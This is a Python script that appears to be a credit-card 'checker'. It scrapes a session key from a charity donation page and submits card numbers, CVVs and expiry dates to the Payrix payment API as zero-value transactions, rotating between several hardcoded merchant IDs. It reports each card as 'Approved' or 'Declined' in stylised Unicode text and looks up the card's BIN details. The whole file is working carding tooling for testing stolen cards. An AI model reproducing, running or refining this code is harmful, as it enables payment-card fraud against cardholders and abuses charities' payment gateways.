import requests
from bs4 import BeautifulSoup
import random

# Define the CID and merchant pairs in a list of dictionaries
PAYMENT_GATEWAYS = [
    {"cid": "15724", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
    {"cid": "1177", "merchant": "p1_mer_66902775744ddec5a326b9a"},  # Add more pairs as needed
    {"cid": "6002", "merchant": "p1_mer_6690266e2b133b62945a047"},
    {"cid": "10334", "merchant": "p1_mer_66d212af800dc73de2ba7dd"},
    {"cid": "12196", "merchant": "p1_mer_66d20ae66feda63af8d82ee"},  # Add more pairs as needed
]

def process_payment(card_number, exp_month, exp_year, cvv):
    try:
        # Randomly select a gateway configuration
        gateway = random.choice(PAYMENT_GATEWAYS)
        cid = gateway["cid"]
        merchant = gateway["merchant"]

        url1 = "https://donate.givedirect.org"
        params = {'cid': cid}
        headers1 = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Cache-Control': "max-age=0",
            'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'Upgrade-Insecure-Requests': "1",
            'Sec-Fetch-Site': "cross-site",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-User': "?1",
            'Sec-Fetch-Dest': "document",
            'Referer': "https://www.womensurgeons.org/donate-to-the-foundation",
            'Accept-Language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
        }
        response1 = requests.get(url1, params=params, headers=headers1)
        soup = BeautifulSoup(response1.text, 'html.parser')
        txnsession_key = soup.find('input', {'id': 'txnsession_key'})['value']

        url2 = "https://api.payrix.com/txns"
        payload = {
            'origin': "1",
            'merchant': merchant,
            'type': "2",
            'total': "0",
            'description': "donate live site",
            'payment[number]': card_number,
            'payment[cvv]': cvv,
            'expiration': f"{exp_month}{exp_year}",
            'zip': "",
            'last': "Tech"
        }
        headers2 = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
            'sec-ch-ua-mobile': "?1",
            'txnsessionkey': txnsession_key,
            'x-requested-with': "XMLHttpRequest"
        }
        response2 = requests.post(url2, data=payload, headers=headers2)
        response_json = response2.json()
        errors = response_json['response']['errors']

        if errors:
            error_msg = errors[0]['msg']
            if error_msg == "Transaction declined: No 'To' Account Specified":
                return "𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱\n𝗥𝗲𝗮𝘀𝗼𝗻: 𝗡𝗼𝘁 𝗳𝗼𝘂𝗻𝗱, 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿"
            else:
                return error_msg
        else:
            return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
    except Exception as e:
        print(f"Payment API Error: {str(e)}")
        return "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱 𝘄𝗵𝗶𝗹𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗮𝗿𝗱."

def get_bin_info(card_number):
    bin_number = card_number[:6]
    try:
        url = f"https://api.juspay.in/cardbins/{bin_number}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return {
                "brand": data.get("brand", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "type": data.get("type", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "sub_type": data.get("card_sub_type", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "bank": data.get("bank", "�_U𝗻𝗸𝗻𝗼𝘄𝗻"),
                "country": data.get("country", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "country_code": data.get("country_code", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
            }
    except Exception as e:
        print(f"BIN API Error: {str(e)}")
    return {"brand": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "type": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "sub_type": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "bank": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "country": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "country_code": "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"}
